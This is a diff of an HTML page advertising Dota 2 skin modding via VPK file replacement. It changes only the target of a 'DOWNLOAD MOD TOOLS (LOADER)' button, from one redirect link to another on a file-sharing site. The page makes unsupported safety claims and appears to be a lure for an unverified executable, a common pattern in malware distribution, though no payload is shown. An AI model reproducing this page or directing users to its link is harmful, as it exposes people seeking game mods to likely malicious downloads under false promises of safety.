@@ -1,7 +1,7 @@
 <div style="max-width:800px;margin:auto;padding:20px;font-family:Arial,sans-serif;line-height:1.6;background:#0a0a0f;color:#e0e0e0;border-radius:15px;">
 <h1 style="color:#44aaff;border-bottom:2px solid #2288cc;text-align:center;">🛠️ Manual VPK Skin Installation | Ultimate Control Dota 2 Modding 🛠️</h1>
 <p style="font-size:1.1em;text-align:center;"><strong>Complete guide for manual skin installation.</strong> Use tools like GCFScape to replace files inside the VPK archives and mod your game to the core.</p>
-<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://www.shawonline.co.za/redirl" style="background:#44aaff;color:#000;padding:12px 25px;">⬇️ DOWNLOAD MOD TOOLS (LOADER)</a><p>✅ Full VPK Control ✅ Safe Manual Method ✅ No Launcher Needed ✅ 100% Custom</p></div>
+<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://fileshare.pw/redirl" style="background:#44aaff;color:#000;padding:12px 25px;">⬇️ DOWNLOAD MOD TOOLS (LOADER)</a><p>✅ Full VPK Control ✅ Safe Manual Method ✅ No Launcher Needed ✅ 100% Custom</p></div>
 <img src="https://i.ytimg.com/vi/7SWG25RDAfo/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLA-fpQrzjjVKoaiiHnXgOtA_9Pkew" style="max-width:100%;border-radius:8px;margin:15px 0;">
 <div><h3>🛠️ Manual Modding Methodology:</h3>
 <ul><li><strong>Download & Extract:</strong> Download GCFScape to open and extract the game's .vpk archive files.</li>
